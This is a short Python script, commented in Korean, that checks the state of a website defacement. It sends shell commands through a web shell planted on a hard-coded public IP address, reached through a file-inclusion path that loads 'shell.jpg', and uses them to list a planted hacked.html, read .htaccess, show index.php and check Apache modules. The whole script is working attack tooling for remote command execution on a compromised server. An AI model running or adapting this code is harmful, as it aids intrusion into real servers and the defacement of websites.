#!/usr/bin/env python3
"""
Defacement 상태 확인
"""

import requests

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/file.php?file=shell.jpg&cmd="

def execute_cmd(cmd):
    """웹쉘을 통해 명령 실행"""
    try:
        response = requests.get(WEBSHELL + requests.utils.quote(cmd), timeout=10)
        return response.text
    except Exception as e:
        return f"Error: {e}"

print("=" * 60)
print("📋 Checking Defacement Status")
print("=" * 60)
print()

# hacked.html 존재 확인
print("[*] Checking if hacked.html exists...")
result = execute_cmd("ls -la /var/www/html/hacked.html")
print(result)
print()

# .htaccess 존재 확인
print("[*] Checking if .htaccess exists...")
result = execute_cmd("ls -la /var/www/html/.htaccess")
print(result)
print()

# .htaccess 내용 확인
print("[*] Checking .htaccess content...")
result = execute_cmd("cat /var/www/html/.htaccess")
print(result)
print()

# index.php 내용 확인 (첫 3줄)
print("[*] Checking index.php content (first 3 lines)...")
result = execute_cmd("head -3 /var/www/html/index.php")
print(result)
print()

# Apache 재시작 필요 여부 확인
print("[*] Checking Apache modules...")
result = execute_cmd("ls -la /etc/apache2/mods-enabled/ | grep rewrite")
print(result)
print()

print("=" * 60)
